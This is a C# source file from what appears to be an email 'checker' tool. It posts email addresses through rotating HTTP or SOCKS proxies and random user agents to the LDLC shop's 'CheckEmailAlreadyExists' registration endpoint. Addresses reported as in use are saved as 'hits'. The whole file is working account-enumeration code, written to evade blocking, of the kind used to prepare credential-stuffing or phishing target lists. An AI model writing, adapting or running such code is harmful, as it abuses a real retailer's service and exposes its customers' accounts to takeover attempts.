using System;
using Leaf.xNet;
using CheckerSimplefied;

namespace SC___Mail_Validator
{
    public class LdlcVM
    {
        public static void postRequests(string username)
        {
            Utilities.name = "LDLC";
            for (; ; )
            {
                try
                {
                    if (Program.proxyType > 0)
                    {
                        Program.proxies = Program.PROXIES[new Random().Next(Program.PROXIES.Count)];
                    }
                    using (HttpRequest request = new HttpRequest())
                    {
                        switch ((int)((uint)Program.proxyType + ~(uint)1 + (uint)1))
                        {
                            case 0:
                                request.Proxy = HttpProxyClient.Parse(Program.proxies);
                                break;
                            case 1:
                                request.Proxy = Socks4ProxyClient.Parse(Program.proxies);
                                break;
                            case 2:
                                request.Proxy = Socks5ProxyClient.Parse(Program.proxies);
                                break;
                        }
                        request.KeepAlive = true;
                        request.ConnectTimeout = 2500;
                        request.IgnoreProtocolErrors = true;
                        AmelioratedWrapper.AddHeaderWithStyle(request, "User-Agent: " + Http.RandomUserAgent());
                        AmelioratedWrapper.AddHeaderWithStyle(request, "Content-Type: application/x-www-form-urlencoded");
                        AmelioratedWrapper.AddHeaderWithStyle(request, "origin: https://secure2.ldlc.com");
                        AmelioratedWrapper.AddHeaderWithStyle(request, "referer: https://secure2.ldlc.com/fr-fr/Login/Register?returnUrl=%2Ffr-fr%2FAccount");
                        string url = "https://secure2.ldlc.com/fr-fr/Login/CheckEmailAlreadyExists";
                        var response = request.Raw(HttpMethod.POST, url, (HttpContent)new StringContent("email=" + username)).ToString();

                        if (response.Contains("Le mail est déjà utilisé"))
                        {
                            Utilities.saveHits(username);
                            break;
                        }
                        if (response.Contains("true"))
                        {
                            Utilities.saveFail(username);
                            break;
                        }
                    }
                }
                catch (Exception)
                {
                    Utilities.catchRetry();
                }
            }
        }
    }
}
